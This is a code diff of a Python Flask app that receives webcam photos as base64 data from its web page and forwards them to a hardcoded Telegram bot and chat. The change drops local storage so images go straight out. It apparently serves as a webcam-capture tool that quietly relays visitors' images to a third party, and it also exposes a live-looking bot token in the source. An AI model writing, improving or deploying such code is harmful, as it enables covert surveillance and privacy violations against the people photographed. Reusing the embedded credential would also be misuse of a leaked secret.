@@ -1,6 +1,5 @@
 from flask import Flask, request, render_template_string, jsonify
 import requests
-import os
 import base64
 from datetime import datetime
 
@@ -9,11 +8,6 @@ app = Flask(__name__)
 # Telegram Bot API details
 BOT_TOKEN = "7379451782:AAGMp5sONfsjO2IdZzU9Hp-AuN68TgaZXiw"
 CHAT_ID = "5095137619"
-
-# Directory to save images temporarily
-UPLOAD_FOLDER = "uploads"
-if not os.path.exists(UPLOAD_FOLDER):
-    os.makedirs(UPLOAD_FOLDER)
 
 # HTML content embedded in Python
 HTML_CONTENT = """
@@ -315,7 +309,7 @@ def index():
     return render_template_string(HTML_CONTENT)
 
 
-# Route to handle photo uploads
+# Route to handle photo uploads and send them to Telegram directly
 @app.route('/upload_photo', methods=['POST'])
 def upload_photo():
     data = request.get_json()
@@ -324,29 +318,25 @@ def upload_photo():
     if image_data:
         # Remove the base64 header
         image_data = image_data.split(",")[1]
-        # Decode and save the photo
+        # Decode the image data
         image = base64.b64decode(image_data)
-        filename = f"{UPLOAD_FOLDER}/photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
-        with open(filename, 'wb') as f:
-            f.write(image)
 
-        # Send the image to Telegram
-        send_to_telegram(filename)
+        # Send the image to Telegram directly without saving it to the server
+        send_to_telegram(image)
 
-        return jsonify({'status': 'success', 'message': 'Photo uploaded successfully'})
+        return jsonify({'status': 'success', 'message': 'Photo uploaded and sent to Telegram'})
     else:
         return jsonify({'status': 'error', 'message': 'No image data found'}), 400
 
 
 # Function to send the photo to Telegram
-def send_to_telegram(photo_path):
-    with open(photo_path, 'rb') as f:
-        files = {'photo': f}
-        data = {
-            'chat_id': CHAT_ID,
-            'caption': 'New photo from webcam'
-        }
-        requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto', data=data, files=files)
+def send_to_telegram(image_data):
+    files = {'photo': ('photo.png', image_data)}
+    data = {
+        'chat_id': CHAT_ID,
+        'caption': 'New photo from webcam'
+    }
+    requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto', data=data, files=files)
 
 
 if __name__ == '__main__':
